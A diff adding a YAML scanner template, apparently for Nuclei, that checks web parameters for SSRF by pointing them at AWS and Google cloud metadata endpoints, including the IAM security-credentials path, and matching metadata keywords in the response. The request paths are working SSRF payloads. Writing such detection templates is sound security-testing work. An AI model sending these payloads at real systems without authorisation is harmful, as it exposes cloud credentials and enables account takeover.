@@ -1,0 +1,32 @@
+id: cloud-metadata-ssrf
+info:
+  name: SSRF to cloud instance metadata (IMDS)
+  severity: critical
+  description: A url/redirect parameter is fetched server-side and reflected, letting an attacker reach the cloud metadata endpoint (169.254.169.254). AWS IMDSv1 returns instance and IAM credential data, which is a direct path to cloud account takeover.
+  tags: vuln,ssrf,cloud,aws,metadata
+  metadata:
+    category: vulnerabilities
+    cwe: CWE-918
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/?dest=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?uri=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?target=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "security-credentials"
+          - "iam/security-credentials"
+          - "instance-action"
+        condition: or
+      - type: status
+        status:
+          - 200
